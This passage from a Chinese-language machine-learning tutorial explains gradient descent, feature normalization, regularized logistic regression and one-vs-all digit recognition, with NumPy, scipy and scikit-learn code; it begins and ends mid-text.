\u53ef\u4ee5\u770b\u51fa\uff0c`\u03b1`\u662f\u53d6\u5f97\u5f88\u5c0f\u7684\u6b63\u6570\uff0c`[f'(x)]\u00b2`\u4e5f\u662f\u6b63\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u5f97\u51fa\uff1a`f(x+\u25b3x)<=f(x)`\n - \u6240\u4ee5\u6cbf\u7740**\u8d1f\u68af\u5ea6**\u653e\u4e0b\uff0c\u51fd\u6570\u5728\u51cf\u5c0f\uff0c\u591a\u7ef4\u60c5\u51b5\u4e00\u6837\u3002\n- \u5b9e\u73b0\u4ee3\u7801\n```\n# \u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\ndef gradientDescent(X,y,theta,alpha,num_iters):\n    m = len(y)      \n    n = len(theta)\n    \n    temp = np.matrix(np.zeros((n,num_iters)))   # \u6682\u5b58\u6bcf\u6b21\u8fed\u4ee3\u8ba1\u7b97\u7684theta\uff0c\u8f6c\u5316\u4e3a\u77e9\u9635\u5f62\u5f0f\n    \n    \n    J_history = np.zeros((num_iters,1)) #\u8bb0\u5f55\u6bcf\u6b21\u8fed\u4ee3\u8ba1\u7b97\u7684\u4ee3\u4ef7\u503c\n    \n    for i in range(num_iters):  # \u904d\u5386\u8fed\u4ee3\u6b21\u6570    \n        h = np.dot(X,theta)     # \u8ba1\u7b97\u5185\u79ef\uff0cmatrix\u53ef\u4ee5\u76f4\u63a5\u4e58\n        temp[:,i] = theta - ((alpha\/m)*(np.dot(np.transpose(X),h-y)))   #\u68af\u5ea6\u7684\u8ba1\u7b97\n        theta = temp[:,i]\n        J_history[i] = computerCost(X,y,theta)      #\u8c03\u7528\u8ba1\u7b97\u4ee3\u4ef7\u51fd\u6570\n        print '.',      \n    return theta,J_history  \n```\n\n### 3\u3001\u5747\u503c\u5f52\u4e00\u5316\n- \u76ee\u7684\u662f\u4f7f\u6570\u636e\u90fd\u7f29\u653e\u5230\u4e00\u4e2a\u8303\u56f4\u5185\uff0c\u4fbf\u4e8e\u4f7f\u7528\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\n- ![{x_i} = \\frac{{{x_i} - {\\mu _i}}}{{{s_i}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bx_i%7D%20%3D%20%5Cfrac%7B%7B%7Bx_i%7D%20-%20%7B%5Cmu%20_i%7D%7D%7D%7B%7B%7Bs_i%7D%7D%7D)\n- \u5176\u4e2d ![{{\\mu _i}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7B%5Cmu%20_i%7D%7D) \u4e3a\u6240\u6709\u6b64feture\u6570\u636e\u7684\u5e73\u5747\u503c\n- ![{{s_i}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7Bs_i%7D%7D)\u53ef\u4ee5\u662f**\u6700\u5927\u503c-\u6700\u5c0f\u503c**\uff0c\u4e5f\u53ef\u4ee5\u662f\u8fd9\u4e2afeature\u5bf9\u5e94\u7684\u6570\u636e\u7684**\u6807\u51c6\u5dee**\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u5f52\u4e00\u5316feature\ndef featureNormaliza(X):\n    X_norm = np.array(X)            #\u5c06X\u8f6c\u5316\u4e3anumpy\u6570\u7ec4\u5bf9\u8c61\uff0c\u624d\u53ef\u4ee5\u8fdb\u884c\u77e9\u9635\u7684\u8fd0\u7b97\n    #\u5b9a\u4e49\u6240\u9700\u53d8\u91cf\n    mu = np.zeros((1,X.shape[1]))   \n    sigma = np.zeros((1,X.shape[1]))\n    \n    mu = np.mean(X_norm,0)          # \u6c42\u6bcf\u4e00\u5217\u7684\u5e73\u5747\u503c\uff080\u6307\u5b9a\u4e3a\u5217\uff0c1\u4ee3\u8868\u884c\uff09\n    sigma = np.std(X_norm,0)        # \u6c42\u6bcf\u4e00\u5217\u7684\u6807\u51c6\u5dee\n    for i in range(X.shape[1]):     # \u904d\u5386\u5217\n        X_norm[:,i] = (X_norm[:,i]-mu[i])\/sigma[i]  # \u5f52\u4e00\u5316\n    \n    return X_norm,mu,sigma\n```\n- \u6ce8\u610f\u9884\u6d4b\u7684\u65f6\u5019\u4e5f\u9700\u8981\u5747\u503c\u5f52\u4e00\u5316\u6570\u636e\n\n### 4\u3001\u6700\u7ec8\u8fd0\u884c\u7ed3\u679c\n- \u4ee3\u4ef7\u968f\u8fed\u4ee3\u6b21\u6570\u7684\u53d8\u5316   \n![enter description here][1]\n\n\n### 5\u3001[\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u7ebf\u6027\u6a21\u578b\u5b9e\u73b0](\/LinearRegression\/LinearRegression_scikit-learn.py)\n- \u5bfc\u5165\u5305\n```\nfrom sklearn import linear_model\nfrom sklearn.preprocessing import StandardScaler    #\u5f15\u5165\u7f29\u653e\u7684\u5305\n```\n- \u5f52\u4e00\u5316\n```\n    # \u5f52\u4e00\u5316\u64cd\u4f5c\n    scaler = StandardScaler()   \n    scaler.fit(X)\n    x_train = scaler.transform(X)\n    x_test = scaler.transform(np.array([1650,3]))\n```\n- \u7ebf\u6027\u6a21\u578b\u62df\u5408\n```\n    # \u7ebf\u6027\u6a21\u578b\u62df\u5408\n    model = linear_model.LinearRegression()\n    model.fit(x_train, y)\n``` \n- \u9884\u6d4b\n```\n    #\u9884\u6d4b\u7ed3\u679c\n    result = model.predict(x_test)\n```\n\n-------------------\n\n  \n## \u4e8c\u3001[\u903b\u8f91\u56de\u5f52](\/LogisticRegression)\n- [\u5168\u90e8\u4ee3\u7801](\/LogisticRegression\/LogisticRegression.py)\n\n### 1\u3001\u4ee3\u4ef7\u51fd\u6570\n- ![\\left\\{ \\begin{gathered}\n  J(\\theta ) = \\frac{1}{m}\\sum\\limits_{i = 1}^m {\\cos t({h_\\theta }({x^{(i)}}),{y^{(i)}})}  \\hfill \\\\\n  \\cos t({h_\\theta }(x),y) = \\left\\{ {\\begin{array}{c}    { - \\log ({h_\\theta }(x))} \\\\    { - \\log (1 - {h_\\theta }(x))}  \\end{array} \\begin{array}{c}    {y = 1} \\\\    {y = 0}  \\end{array} } \\right. \\hfill \\\\ \n\\end{gathered}  \\right.](http:\/\/latex.codecogs.com\/gif.latex?%5Clarge%20%5Cleft%5C%7B%20%5Cbegin%7Bgathered%7D%20J%28%5Ctheta%20%29%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5Ccos%20t%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%2C%7By%5E%7B%28i%29%7D%7D%29%7D%20%5Chfill%20%5C%5C%20%5Ccos%20t%28%7Bh_%5Ctheta%20%7D%28x%29%2Cy%29%20%3D%20%5Cleft%5C%7B%20%7B%5Cbegin%7Barray%7D%7Bc%7D%20%7B%20-%20%5Clog%20%28%7Bh_%5Ctheta%20%7D%28x%29%29%7D%20%5C%5C%20%7B%20-%20%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28x%29%29%7D%20%5Cend%7Barray%7D%20%5Cbegin%7Barray%7D%7Bc%7D%20%7By%20%3D%201%7D%20%5C%5C%20%7By%20%3D%200%7D%20%5Cend%7Barray%7D%20%7D%20%5Cright.%20%5Chfill%20%5C%5C%20%5Cend%7Bgathered%7D%20%5Cright.)\n- \u53ef\u4ee5\u7efc\u5408\u8d77\u6765\u4e3a\uff1a\n![J(\\theta ) =  - \\frac{1}{m}\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\log ({h_\\theta }({x^{(i)}}) + (1 - } {y^{(i)}})\\log (1 - {h_\\theta }({x^{(i)}})]](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20%20-%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Clog%20%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7D%20%7By%5E%7B%28i%29%7D%7D%29%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%5D)\n\u5176\u4e2d\uff1a\n![{h_\\theta }(x) = \\frac{1}{{1 + {e^{ - x}}}}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7Bh_%5Ctheta%20%7D%28x%29%20%3D%20%5Cfrac%7B1%7D%7B%7B1%20%2B%20%7Be%5E%7B%20-%20x%7D%7D%7D%7D)\n- \u4e3a\u4ec0\u4e48\u4e0d\u7528\u7ebf\u6027\u56de\u5f52\u7684\u4ee3\u4ef7\u51fd\u6570\u8868\u793a\uff0c\u56e0\u4e3a\u7ebf\u6027\u56de\u5f52\u7684\u4ee3\u4ef7\u51fd\u6570\u53ef\u80fd\u662f\u975e\u51f8\u7684\uff0c\u5bf9\u4e8e\u5206\u7c7b\u95ee\u9898\uff0c\u4f7f\u7528\u68af\u5ea6\u4e0b\u964d\u5f88\u96be\u5f97\u5230\u6700\u5c0f\u503c\uff0c\u4e0a\u9762\u7684\u4ee3\u4ef7\u51fd\u6570\u662f\u51f8\u51fd\u6570\n- ![{ - \\log ({h_\\theta }(x))}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%20-%20%5Clog%20%28%7Bh_%5Ctheta%20%7D%28x%29%29%7D)\u7684\u56fe\u50cf\u5982\u4e0b\uff0c\u5373`y=1`\u65f6\uff1a\n![enter description here][2]\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5f53![{{h_\\theta }(x)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7Bh_%5Ctheta%20%7D%28x%29%7D)\u8d8b\u4e8e`1`\uff0c`y=1`,\u4e0e\u9884\u6d4b\u503c\u4e00\u81f4\uff0c\u6b64\u65f6\u4ed8\u51fa\u7684\u4ee3\u4ef7`cost`\u8d8b\u4e8e`0`\uff0c\u82e5![{{h_\\theta }(x)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7Bh_%5Ctheta%20%7D%28x%29%7D)\u8d8b\u4e8e`0`\uff0c`y=1`,\u6b64\u65f6\u7684\u4ee3\u4ef7`cost`\u503c\u975e\u5e38\u5927\uff0c\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u6700\u5c0f\u5316\u4ee3\u4ef7\u503c\n- \u540c\u7406![{ - \\log (1 - {h_\\theta }(x))}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%20-%20%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28x%29%29%7D)\u7684\u56fe\u50cf\u5982\u4e0b\uff08`y=0`\uff09\uff1a   \n![enter description here][3]\n\n### 2\u3001\u68af\u5ea6\n- \u540c\u6837\u5bf9\u4ee3\u4ef7\u51fd\u6570\u6c42\u504f\u5bfc\uff1a\n![\\frac{{\\partial J(\\theta )}}{{\\partial {\\theta _j}}} = \\frac{1}{m}\\sum\\limits_{i = 1}^m {[({h_\\theta }({x^{(i)}}) - {y^{(i)}})x_j^{(i)}]} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%5Cfrac%7B%7B%5Cpartial%20J%28%5Ctheta%20%29%7D%7D%7B%7B%5Cpartial%20%7B%5Ctheta%20_j%7D%7D%7D%20%3D%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20-%20%7By%5E%7B%28i%29%7D%7D%29x_j%5E%7B%28i%29%7D%5D%7D%20)   \n\u53ef\u4ee5\u770b\u51fa\u4e0e\u7ebf\u6027\u56de\u5f52\u7684\u504f\u5bfc\u6570\u4e00\u81f4\n- \u63a8\u5230\u8fc7\u7a0b\n![enter description here][4]\n\n### 3\u3001\u6b63\u5219\u5316\n- \u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62\u8fc7\u62df\u5408\n- \u5728\u4ee3\u4ef7\u51fd\u6570\u4e2d\u52a0\u4e0a\u4e00\u9879![J(\\theta ) =  - \\frac{1}{m}\\sum\\limits_{i = 1}^m {[{y^{(i)}}\\log ({h_\\theta }({x^{(i)}}) + (1 - } {y^{(i)}})\\log (1 - {h_\\theta }({x^{(i)}})] + \\frac{\\lambda }{{2m}}\\sum\\limits_{j = 1}^n {\\theta _j^2} ](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=J%28%5Ctheta%20%29%20%3D%20%20-%20%5Cfrac%7B1%7D%7Bm%7D%5Csum%5Climits_%7Bi%20%3D%201%7D%5Em%20%7B%5B%7By%5E%7B%28i%29%7D%7D%5Clog%20%28%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%20%2B%20%281%20-%20%7D%20%7By%5E%7B%28i%29%7D%7D%29%5Clog%20%281%20-%20%7Bh_%5Ctheta%20%7D%28%7Bx%5E%7B%28i%29%7D%7D%29%5D%20%2B%20%5Cfrac%7B%5Clambda%20%7D%7B%7B2m%7D%7D%5Csum%5Climits_%7Bj%20%3D%201%7D%5En%20%7B%5Ctheta%20_j%5E2%7D%20)\n- \u6ce8\u610fj\u662f\u91cd1\u5f00\u59cb\u7684\uff0c\u56e0\u4e3atheta(0)\u4e3a\u4e00\u4e2a\u5e38\u6570\u9879\uff0cX\u4e2d\u6700\u524d\u9762\u4e00\u5217\u4f1a\u52a0\u4e0a1\u52171\uff0c\u6240\u4ee5\u4e58\u79ef\u8fd8\u662ftheta(0),feature\u6ca1\u6709\u5173\u7cfb\uff0c\u6ca1\u6709\u5fc5\u8981\u6b63\u5219\u5316\n- \u6b63\u5219\u5316\u540e\u7684\u4ee3\u4ef7\uff1a\n```\n# \u4ee3\u4ef7\u51fd\u6570\ndef costFunction(initial_theta,X,y,inital_lambda):\n    m = len(y)\n    J = 0\n    \n    h = sigmoid(np.dot(X,initial_theta))    # \u8ba1\u7b97h(z)\n    theta1 = initial_theta.copy()           # \u56e0\u4e3a\u6b63\u5219\u5316j=1\u4ece1\u5f00\u59cb\uff0c\u4e0d\u5305\u542b0\uff0c\u6240\u4ee5\u590d\u5236\u4e00\u4efd\uff0c\u524dtheta(0)\u503c\u4e3a0 \n    theta1[0] = 0   \n    \n    temp = np.dot(np.transpose(theta1),theta1)\n    J = (-np.dot(np.transpose(y),np.log(h))-np.dot(np.transpose(1-y),np.log(1-h))+temp*inital_lambda\/2)\/m   # \u6b63\u5219\u5316\u7684\u4ee3\u4ef7\u65b9\u7a0b\n    return J\n```\n- \u6b63\u5219\u5316\u540e\u7684\u4ee3\u4ef7\u7684\u68af\u5ea6\n```\n# \u8ba1\u7b97\u68af\u5ea6\ndef gradient(initial_theta,X,y,inital_lambda):\n    m = len(y)\n    grad = np.zeros((initial_theta.shape[0]))\n    \n    h = sigmoid(np.dot(X,initial_theta))# \u8ba1\u7b97h(z)\n    theta1 = initial_theta.copy()\n    theta1[0] = 0\n\n    grad = np.dot(np.transpose(X),h-y)\/m+inital_lambda\/m*theta1 #\u6b63\u5219\u5316\u7684\u68af\u5ea6\n    return grad  \n```\n\n### 4\u3001S\u578b\u51fd\u6570\uff08\u5373![{{h_\\theta }(x)}](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=%7B%7Bh_%5Ctheta%20%7D%28x%29%7D)\uff09\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# S\u578b\u51fd\u6570    \ndef sigmoid(z):\n    h = np.zeros((len(z),1))    # \u521d\u59cb\u5316\uff0c\u4e0ez\u7684\u957f\u5ea6\u4e00\u7f6e\n    \n    h = 1.0\/(1.0+np.exp(-z))\n    return h\n```\n\n### 5\u3001\u6620\u5c04\u4e3a\u591a\u9879\u5f0f\n- \u56e0\u4e3a\u6570\u636e\u7684feture\u53ef\u80fd\u5f88\u5c11\uff0c\u5bfc\u81f4\u504f\u5dee\u5927\uff0c\u6240\u4ee5\u521b\u9020\u51fa\u4e00\u4e9bfeture\u7ed3\u5408\n- eg:\u6620\u5c04\u4e3a2\u6b21\u65b9\u7684\u5f62\u5f0f:![1 + {x_1} + {x_2} + x_1^2 + {x_1}{x_2} + x_2^2](http:\/\/chart.apis.google.com\/chart?cht=tx&chs=1x0&chf=bg,s,FFFFFF00&chco=000000&chl=1%20%2B%20%7Bx_1%7D%20%2B%20%7Bx_2%7D%20%2B%20x_1%5E2%20%2B%20%7Bx_1%7D%7Bx_2%7D%20%2B%20x_2%5E2)\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u6620\u5c04\u4e3a\u591a\u9879\u5f0f \ndef mapFeature(X1,X2):\n    degree = 3;                     # \u6620\u5c04\u7684\u6700\u9ad8\u6b21\u65b9\n    out = np.ones((X1.shape[0],1))  # \u6620\u5c04\u540e\u7684\u7ed3\u679c\u6570\u7ec4\uff08\u53d6\u4ee3X\uff09\n    '''\n    \u8fd9\u91cc\u4ee5degree=2\u4e3a\u4f8b\uff0c\u6620\u5c04\u4e3a1,x1,x2,x1^2,x1,x2,x2^2\n    '''\n    for i in np.arange(1,degree+1): \n        for j in range(i+1):\n            temp = X1**(i-j)*(X2**j)    #\u77e9\u9635\u76f4\u63a5\u4e58\u76f8\u5f53\u4e8ematlab\u4e2d\u7684\u70b9\u4e58.*\n            out = np.hstack((out, temp.reshape(-1,1)))\n    return out\n```\n\n### 6\u3001\u4f7f\u7528`scipy`\u7684\u4f18\u5316\u65b9\u6cd5\n- \u68af\u5ea6\u4e0b\u964d\u4f7f\u7528`scipy`\u4e2d`optimize`\u4e2d\u7684`fmin_bfgs`\u51fd\u6570\n- \u8c03\u7528scipy\u4e2d\u7684\u4f18\u5316\u7b97\u6cd5fmin_bfgs\uff08\u62df\u725b\u987f\u6cd5Broyden-Fletcher-Goldfarb-Shanno\n - costFunction\u662f\u81ea\u5df1\u5b9e\u73b0\u7684\u4e00\u4e2a\u6c42\u4ee3\u4ef7\u7684\u51fd\u6570\uff0c\n - initial_theta\u8868\u793a\u521d\u59cb\u5316\u7684\u503c,\n - fprime\u6307\u5b9acostFunction\u7684\u68af\u5ea6\n - args\u662f\u5176\u4f59\u6d4b\u53c2\u6570\uff0c\u4ee5\u5143\u7ec4\u7684\u5f62\u5f0f\u4f20\u5165\uff0c\u6700\u540e\u4f1a\u5c06\u6700\u5c0f\u5316costFunction\u7684theta\u8fd4\u56de \n```\n    result = optimize.fmin_bfgs(costFunction, initial_theta, fprime=gradient, args=(X,y,initial_lambda))    \n```   \n\n### 7\u3001\u8fd0\u884c\u7ed3\u679c\n- data1\u51b3\u7b56\u8fb9\u754c\u548c\u51c6\u786e\u5ea6  \n![enter description here][5]\n![enter description here][6]\n- data2\u51b3\u7b56\u8fb9\u754c\u548c\u51c6\u786e\u5ea6  \n![enter description here][7]\n![enter description here][8]\n\n### 8\u3001[\u4f7f\u7528scikit-learn\u5e93\u4e2d\u7684\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5b9e\u73b0](\/LogisticRegression\/LogisticRegression_scikit-learn.py)\n- \u5bfc\u5165\u5305\n```\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.cross_validation import train_test_split\nimport numpy as np\n```\n- \u5212\u5206\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\n```\n    # \u5212\u5206\u4e3a\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\n    x_train,x_test,y_train,y_test = train_test_split(X,y,test_size=0.2)\n```\n- \u5f52\u4e00\u5316\n```\n    # \u5f52\u4e00\u5316\n    scaler = StandardScaler()\n    x_train = scaler.fit_transform(x_train)\n    x_test = scaler.fit_transform(x_test)\n```\n- \u903b\u8f91\u56de\u5f52\n```\n    #\u903b\u8f91\u56de\u5f52\n    model = LogisticRegression()\n    model.fit(x_train,y_train)\n``` \n- \u9884\u6d4b\n```\n    # \u9884\u6d4b\n    predict = model.predict(x_test)\n    right = sum(predict == y_test)\n    \n    predict = np.hstack((predict.reshape(-1,1),y_test.reshape(-1,1)))   # \u5c06\u9884\u6d4b\u503c\u548c\u771f\u5b9e\u503c\u653e\u5728\u4e00\u5757\uff0c\u597d\u89c2\u5bdf\n    print predict\n    print ('\u6d4b\u8bd5\u96c6\u51c6\u786e\u7387\uff1a%f%%'%(right*100.0\/predict.shape[0]))          #\u8ba1\u7b97\u5728\u6d4b\u8bd5\u96c6\u4e0a\u7684\u51c6\u786e\u5ea6\n```\n\n\n-------------\n\n## [\u903b\u8f91\u56de\u5f52_\u624b\u5199\u6570\u5b57\u8bc6\u522b_OneVsAll](\/LogisticRegression)\n- [\u5168\u90e8\u4ee3\u7801](\/LogisticRegression\/LogisticRegression_OneVsAll.py)\n\n### 1\u3001\u968f\u673a\u663e\u793a100\u4e2a\u6570\u5b57\n- \u6211\u6ca1\u6709\u4f7f\u7528scikit-learn\u4e2d\u7684\u6570\u636e\u96c6\uff0c\u50cf\u7d20\u662f20*20px\uff0c\u5f69\u8272\u56fe\u5982\u4e0b\n![enter description here][9]\n\u7070\u5ea6\u56fe\uff1a\n![enter description here][10]\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u663e\u793a100\u4e2a\u6570\u5b57\ndef display_data(imgData):\n    sum = 0\n    '''\n    \u663e\u793a100\u4e2a\u6570\uff08\u82e5\u662f\u4e00\u4e2a\u4e00\u4e2a\u7ed8\u5236\u5c06\u4f1a\u975e\u5e38\u6162\uff0c\u53ef\u4ee5\u5c06\u8981\u753b\u7684\u6570\u5b57\u6574\u7406\u597d\uff0c\u653e\u5230\u4e00\u4e2a\u77e9\u9635\u4e2d\uff0c\u663e\u793a\u8fd9\u4e2a\u77e9\u9635\u5373\u53ef\uff09\n    - \u521d\u59cb\u5316\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\n    - \u5c06\u6bcf\u884c\u7684\u6570\u636e\u8c03\u6574\u6210\u56fe\u50cf\u7684\u77e9\u9635\uff0c\u653e\u8fdb\u4e8c\u7ef4\u6570\u7ec4\n    - \u663e\u793a\u5373\u53ef\n    '''\n    pad = 1\n    display_array = -np.ones((pad+10*(20+pad),pad+10*(20+pad)))\n    for i in range(10):\n        for j in range(10):\n            display_array[pad+i*(20+pad):pad+i*(20+pad)+20,pad+j*(20+pad):pad+j*(20+pad)+20] = (imgData[sum,:].reshape(20,20,order=\"F\"))    # order=F\u6307\u5b9a\u4ee5\u5217\u4f18\u5148\uff0c\u5728matlab\u4e2d\u662f\u8fd9\u6837\u7684\uff0cpython\u4e2d\u9700\u8981\u6307\u5b9a\uff0c\u9ed8\u8ba4\u4ee5\u884c\n            sum += 1\n            \n    plt.imshow(display_array,cmap='gray')   #\u663e\u793a\u7070\u5ea6\u56fe\u50cf\n    plt.axis('off')\n    plt.show()\n```\n\n### 2\u3001OneVsAll\n- \u5982\u4f55\u5229\u7528\u903b\u8f91\u56de\u5f52\u89e3\u51b3\u591a\u5206\u7c7b\u7684\u95ee\u9898\uff0cOneVsAll\u5c31\u662f\u628a\u5f53\u524d\u67d0\u4e00\u7c7b\u770b\u6210\u4e00\u7c7b\uff0c\u5176\u4ed6\u6240\u6709\u7c7b\u522b\u770b\u4f5c\u4e00\u7c7b\uff0c\u8fd9\u6837\u6709\u6210\u4e86\u4e8c\u5206\u7c7b\u7684\u95ee\u9898\u4e86\n- \u5982\u4e0b\u56fe\uff0c\u628a\u9014\u4e2d\u7684\u6570\u636e\u5206\u6210\u4e09\u7c7b\uff0c\u5148\u628a\u7ea2\u8272\u7684\u770b\u6210\u4e00\u7c7b\uff0c\u628a\u5176\u4ed6\u7684\u770b\u4f5c\u53e6\u5916\u4e00\u7c7b\uff0c\u8fdb\u884c\u903b\u8f91\u56de\u5f52\uff0c\u7136\u540e\u628a\u84dd\u8272\u7684\u770b\u6210\u4e00\u7c7b\uff0c\u5176\u4ed6\u7684\u518d\u770b\u6210\u4e00\u7c7b\uff0c\u4ee5\u6b64\u7c7b\u63a8...\n![enter description here][11]\n- \u53ef\u4ee5\u770b\u51fa\u5927\u4e8e2\u7c7b\u7684\u60c5\u51b5\u4e0b\uff0c\u6709\u591a\u5c11\u7c7b\u5c31\u8981\u8fdb\u884c\u591a\u5c11\u6b21\u7684\u903b\u8f91\u56de\u5f52\u5206\u7c7b\n\n### 3\u3001\u624b\u5199\u6570\u5b57\u8bc6\u522b\n- \u5171\u67090-9\uff0c10\u4e2a\u6570\u5b57\uff0c\u9700\u898110\u6b21\u5206\u7c7b\n- \u7531\u4e8e**\u6570\u636e\u96c6y**\u7ed9\u51fa\u7684\u662f`0,1,2...9`\u7684\u6570\u5b57\uff0c\u800c\u8fdb\u884c\u903b\u8f91\u56de\u5f52\u9700\u8981`0\/1`\u7684label\u6807\u8bb0\uff0c\u6240\u4ee5\u9700\u8981\u5bf9y\u5904\u7406\n- \u8bf4\u4e00\u4e0b\u6570\u636e\u96c6\uff0c\u524d`500`\u4e2a\u662f`0`,`500-1000`\u662f`1`,`...`,\u6240\u4ee5\u5982\u4e0b\u56fe\uff0c\u5904\u7406\u540e\u7684`y`\uff0c**\u524d500\u884c\u7684\u7b2c\u4e00\u5217\u662f1\uff0c\u5176\u4f59\u90fd\u662f0,500-1000\u884c\u7b2c\u4e8c\u5217\u662f1\uff0c\u5176\u4f59\u90fd\u662f0....**\n![enter description here][12]\n- \u7136\u540e\u8c03\u7528**\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5**\u6c42\u89e3`theta`\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u6c42\u6bcf\u4e2a\u5206\u7c7b\u7684theta\uff0c\u6700\u540e\u8fd4\u56de\u6240\u6709\u7684all_theta    \ndef oneVsAll(X,y,num_labels,Lambda):\n    # \u521d\u59cb\u5316\u53d8\u91cf\n    m,n = X.shape\n    all_theta = np.zeros((n+1,num_labels))  # \u6bcf\u4e00\u5217\u5bf9\u5e94\u76f8\u5e94\u5206\u7c7b\u7684theta,\u517110\u5217\n    X = np.hstack((np.ones((m,1)),X))       # X\u524d\u8865\u4e0a\u4e00\u52171\u7684\u504f\u7f6ebias\n    class_y = np.zeros((m,num_labels))      # \u6570\u636e\u7684y\u5bf9\u5e940-9\uff0c\u9700\u8981\u6620\u5c04\u4e3a0\/1\u7684\u5173\u7cfb\n    initial_theta = np.zeros((n+1,1))       # \u521d\u59cb\u5316\u4e00\u4e2a\u5206\u7c7b\u7684theta\n    \n    # \u6620\u5c04y\n    for i in range(num_labels):\n        class_y[:,i] = np.int32(y==i).reshape(1,-1) # \u6ce8\u610freshape(1,-1)\u624d\u53ef\u4ee5\u8d4b\u503c\n    \n    #np.savetxt(\"class_y.csv\", class_y[0:600,:], delimiter=',')    \n    \n    '''\u904d\u5386\u6bcf\u4e2a\u5206\u7c7b\uff0c\u8ba1\u7b97\u5bf9\u5e94\u7684theta\u503c'''\n    for i in range(num_labels):\n        result = optimize.fmin_bfgs(costFunction, initial_theta, fprime=gradient, args=(X,class_y[:,i],Lambda)) # \u8c03\u7528\u68af\u5ea6\u4e0b\u964d\u7684\u4f18\u5316\u65b9\u6cd5\n        all_theta[:,i] = result.reshape(1,-1)   # \u653e\u5165all_theta\u4e2d\n        \n    all_theta = np.transpose(all_theta) \n    return all_theta\n```\n\n### 4\u3001\u9884\u6d4b\n- \u4e4b\u524d\u8bf4\u8fc7\uff0c\u9884\u6d4b\u7684\u7ed3\u679c\u662f\u4e00\u4e2a**\u6982\u7387\u503c**\uff0c\u5229\u7528\u5b66\u4e60\u51fa\u6765\u7684`theta`\u4ee3\u5165\u9884\u6d4b\u7684**S\u578b\u51fd\u6570**\u4e2d\uff0c\u6bcf\u884c\u7684\u6700\u5927\u503c\u5c31\u662f\u662f\u67d0\u4e2a\u6570\u5b57\u7684\u6700\u5927\u6982\u7387\uff0c\u6240\u5728\u7684**\u5217\u53f7**\u5c31\u662f\u9884\u6d4b\u7684\u6570\u5b57\u7684\u771f\u5b9e\u503c,\u56e0\u4e3a\u5728\u5206\u7c7b\u65f6\uff0c\u6240\u6709\u4e3a`0`\u7684\u5c06`y`\u6620\u5c04\u5728\u7b2c\u4e00\u5217\uff0c\u4e3a1\u7684\u6620\u5c04\u5728\u7b2c\u4e8c\u5217\uff0c\u4f9d\u6b21\u7c7b\u63a8\n- \u5b9e\u73b0\u4ee3\u7801\uff1a\n```\n# \u9884\u6d4b\ndef predict_oneVsAll(all_theta,X):\n    m = X.shape[0]\n    num_labels = all_theta.shape[0]\n    p = np.zeros((m,1))\n    X = np.hstack((np.ones((m,1)),X))   #\u5728X\u6700\u524d\u9762\u52a0\u4e00\u52171\n    \n    h = sigmoid(np.dot(X,np.transpose(all_theta)))  #\u9884\u6d4b\n\n    '''\n    \u8fd4\u56deh\u4e2d\u6bcf\u4e00\u884c\u6700\u5927\u503c\u6240\u5728\u7684\u5217\u53f7\n    - np.max(h, 